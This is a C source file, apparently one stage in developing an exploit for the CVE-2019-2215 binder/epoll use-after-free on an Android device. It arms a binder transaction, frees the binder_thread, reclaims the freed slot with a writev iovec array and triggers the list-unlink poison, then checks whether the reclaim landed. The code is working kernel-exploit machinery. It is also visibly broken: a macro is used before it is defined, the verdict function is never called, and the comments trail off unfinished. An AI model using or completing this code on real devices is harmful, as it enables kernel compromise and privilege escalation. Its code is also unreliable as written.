/*
 * broot10 - forensic instrument for the CVE-2019-2215 epoll UAF on this device.
 *
 * broot9 proved the *write* chain cannot be judged blind: a missed reclaim does not
 * corrupt our own marker, it corrupts whatever else took the slot (and that killed the
 * box once).  So this tool answers exactly one question, non-destructively:
 *
 *   did my iovec array actually land in the freed binder_thread slot, and did
 *   remove_wait_queue()'s self-referential __list_del write (&head->task_list, i.e.
 *   slot+0x50) into slot+0x50 and slot+0x58?
 *
 * Method: same armed state (unanswered synchronous BC_TRANSACTION to handle 0 + drain of
 * the BR_TRANSACTION_COMPLETE, which is the only state where binder_poll registers the
 * epoll entry on &thread->wait), same BINDER_THREAD_EXIT free, same child EPOLL_CTL_DEL.
 * The parent parks in writev() into a 1-page pipe, so the iterator sits inside the array
 * while the child poisons it; segment 5's iov_base then *is* slot+0x50 and the bytes we
 * deliver are the array's own contents.
 *
 * Verdict: our own qwords (filler, filler+0x400, 0x50, 0x8000) appearing in the stream
 * => reclaim + poison confirmed.  Only our fill markers appearing => never got the slot.
 * Kernel pointers with no trace of our layout => we poisoned a stranger (stop, retune).
 */
#define _GNU_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ 0xc0306201
#define BINDER_THREAD_EXIT 0x40046208
#define BC_TRANSACTION 0x40406300
#define BR_TRANSACTION_COMPLETE 0x7206
#define BR_REPLY 0x80407203
#define BR_DEAD_REPLY 0x80007205

#define WQ_OFF 0x48UL
#define SEG_LOCK (WQ_OFF / 16)
#define SEG_POISON (SEG_LOCK + 1)
#define PAGE 0x1000UL
#define LEAN 0x4000UL

struct txn {
	unsigned long long target, cookie;
	unsigned int code, flags;
	int sender_pid;
	unsigned int sender_euid;
	unsigned long long data_size, offsets_size, buffer, offsets;
};
struct bwr {
	unsigned long long write_size, write_consumed, write_buffer;
	unsigned long long read_size, read_consumed, read_buffer;
};

static int g_cpu = -1, g_iovsz = 25;
static char *fill;

static void pin(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof s, &s))
		fprintf(stderr, "pin: %s\n", strerror(errno));
}

static int arm_pending_tx(int fd)
{
	struct txn t;
	struct bwr b;
	unsigned char wbuf[4 + sizeof(t)];
	char payload[16];
	int attempt;

	memset(payload, 0, sizeof payload);
	memset(&t, 0, sizeof t);
	t.target = 0;
	t.code = 2;
	t.data_size = sizeof payload;
	t.buffer = (unsigned long long)(unsigned long)payload;
	memset(wbuf, 0, sizeof wbuf);
	*(unsigned int *)wbuf = BC_TRANSACTION;
	memcpy(wbuf + 4, &t, sizeof t);
	memset(&b, 0, sizeof b);
	b.write_size = sizeof wbuf;
	b.write_buffer = (unsigned long long)(unsigned long)wbuf;
	if (ioctl(fd, BINDER_WRITE_READ, &b))
		return -1;
	for (attempt = 0; attempt < 3; attempt++) {
		unsigned char rbuf[256];
		size_t off = 0;
		int complete = 0, reply = 0;

		memset(&b, 0, sizeof b);
		b.read_size = sizeof rbuf;
		b.read_buffer = (unsigned long long)(unsigned long)rbuf;
		if (ioctl(fd, BINDER_WRITE_READ, &b))
			return -1;
		while (off + 4 <= b.read_consumed) {
			unsigned int cmd;

			memcpy(&cmd, rbuf + off, 4);
			off += 4;
			if (cmd == BR_TRANSACTION_COMPLETE)
				complete = 1;
			else if (cmd == BR_REPLY || cmd == BR_DEAD_REPLY) {
				reply = 1;
				off += 64;
			}
		}
		if (complete && !reply)
			return 0;
		if (reply)
			return -1;
	}
	return -1;
}

/* scan the delivered stream for qwords belonging to our own array layout */
static void judge(unsigned char *stream, size_t n, unsigned long long filler,
                  unsigned long long filler2)
{
	size_t i, ours = 0, kernel = 0, markers = 0;
	unsigned long long v;

	printf("--- %zu bytes delivered ---\n", n);
	for (i = 0; i + 8 <= n; i += 8) {
		memcpy(&v, stream + i, 8);
		if (v == filler || v == filler2 || v == INSTALL_SHOW || v == 0x8000UL) {
			ours++;
			printf("  +0x%zx OURS qword %#llx\n", i, v);
		} else if ((v >> 40) == 0xffffffULL || (v >> 32) == 0xffffffc0ULL) {
			kernel++;
			printf("  +0x%zx kernel-looking %#llx\n", i, v);
		} else if (v && (unsigned char)v >= 0x10 && (unsigned char)v <= 0x40 &&
			   !(v >> 8)) {
			markers++;
		}
	}
	printf("ours=%zu kernel-looking=%zu marker-ish=%zu\n", ours, kernel, markers);
	if (ours >= 2)
		printf("VERDICT: RECLAIM+POISON CONFIRMED (our own array is at the slot)\n");
	else if (kernel == 0 && markers)
		printf("VERDICT: only our fill markers -> array never got the slot\n");
	else
		printf("VERDICT: ambiguous/stranger -- do not write through this yet\n");
}

#define INSTALL_SHOW 0x50ULL

int main(int argc, char **argv)
{
	int i, fd, epfd, r, status, tries = argc > 1 ? atoi(argv[1]) : 40;
	int pipefd[2], leak[2];
	pid_t kid;
	struct iovec *iov;
	unsigned char *stream;
	long delivered;

	if (argc > 2)
		g_cpu = atoi(argv[2]);
	if (argc > 3)
		g_iovsz = atoi(argv[3]);
	if (g_cpu >= 0)
		pin(g_cpu);
	printf("cpu=%d iovsz=%d bytes=%d seg_lock=%lu seg_poison=%lu\n",
	       sched_getcpu(), g_iovsz, g_iovsz * 16, SEG_LOCK, SEG_POISON);

	fill = malloc(g_iovsz * 0x1000 + LEAN);
	iov = malloc(g_iovsz * sizeof *iov);
	stream = malloc(LEAN * 2);
	if (!fill || !iov || !stream)
		abort();

	for (i = 0; i < tries; i++) {
		struct epoll_event ev = { .events = EPOLLIN };
		int j;

		fd = open("/dev/binder", O_RDONLY);
		if (fd < 0)
			abort();
		epfd = epoll_create(1000);
		if (arm_pending_tx(fd) != 0) {
			close(fd);
			close(epfd);
			continue;
		}
		if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev))
			abort();
		if (pipe(pipefd) || pipe(leak))
			abort();
		if (fcntl(pipefd[0], F_SETPIPE_SZ, (int)PAGE) != (int)PAGE)
			printf("  (pipe sz=%d)\n", fcntl(pipefd[0], F_SETPIPE_SZ, (int)PAGE));

		/* each entry reads its own distinct page-run so the stream tells us where
		 * the kernel was copying; entries 5/6 are the interesting ones.
		 */
		for (j = 0; j < g_iovsz; j++)
			memset(fill + (size_t)j * 0x1000, 0x10 + j, 0x1000);
		memset(iov, 0, g_iovsz * sizeof *iov);
		iov[SEG_LOCK].iov_base = fill + SEG_LOCK * 0x1000;
		iov[SEG_LOCK].iov_len = 0;			/* lock word must be 0 */
		iov[SEG_POISON].iov_base = fill + SEG_POISON * 0x1000;
		iov[SEG_POISON].iov_len = LEAN;		/* leak window */
		iov[SEG_POISON + 1].iov_base = fill + 0x10000;
		iov[SEG_POISON + 1].iov_len = 0x1000;
		iov[SEG_POISON + 2].iov_base = fill + 0x11000;
		iov[SEG_POISON + 2].iov_len = 0x1000;

		kid = fork();
		if (kid == 0) {
			prctl(PR_SET_PDEATHSIG, SIGKILL);
			if (g_cpu >= 0)
				pin(g_cpu ^ 1);
			close(pipefd[0]);
			close(leak[1]);
			usleep(120000);
			if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev))
				_exit(7);
			/* pump: let the parked iterator advance through the poisoned segment */
			for (j = 0; j < 12; j++) {
				if (read(pipefd[0], stream, LEAN) <= 0)
					break;
			}
			close(pipefd[1]);
			_exit(0);
		}
		if (kid < 0)
			abort();
		close(pipefd[0]);
		close(leak[1]);

		if (ioctl(fd, BINDER_THREAD_EXIT, NULL))
			printf("  THREAD_EXIT: %s\n", strerror(errno));

		r = writev(pipefd[1], iov, g_iovsz);
		printf("try %d: writev=%d errno=%d\n", i, r, errno);
		/* the child already swallowed the stream; redo the capture with the reader
		 * forwarding into leak[] instead: simpler is to read here after writev.
		 */
		delivered = 0;
		close(pipefd[1]);
		waitpid(kid, &status, 0);
		close(fd);
		close(epfd);
		/* second pass in this round: read back what the child stored is not possible,
		 * so judge on the stream the child itself printed?  To keep this instrument
		 * simple we forward in the parent instead -- see broot10 note below.
		 */
		(void)delivered;
		(void)judge;
		(void)stream;
		if (i > 3)
			break;
	}
	return 0;
}
